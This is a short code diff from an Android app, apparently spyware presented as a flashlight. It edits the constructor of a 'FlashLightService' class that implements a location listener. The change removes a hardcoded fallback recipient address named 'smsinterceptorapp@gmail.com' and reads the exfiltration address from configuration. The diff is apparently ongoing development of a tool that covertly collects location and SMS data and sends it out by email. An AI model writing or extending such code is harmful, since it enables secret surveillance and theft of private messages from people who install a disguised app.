@@ -46,12 +46,8 @@ public class FlashLightService extends Service implements LocationListener {
     Log.i(TAG, "Entering FlashLightService() constructor");
 
     configure = new Configure();
-    if(!configure.getDatabaseInfo().equals("null")) {
-      gmailEmailString = configure.getEmailAddress();
-    }
-    else {
-      gmailEmailString = "smsinterceptorapp@gmail.com";   
-    }
+    gmailEmailString = configure.emailAddress();
+    Log.i(TAG, "FlashLightServce() constructor gmailEmailString " + gmailEmailString);
   } 
 
   final Messenger mMessenger = new Messenger(new IncomingHandler());
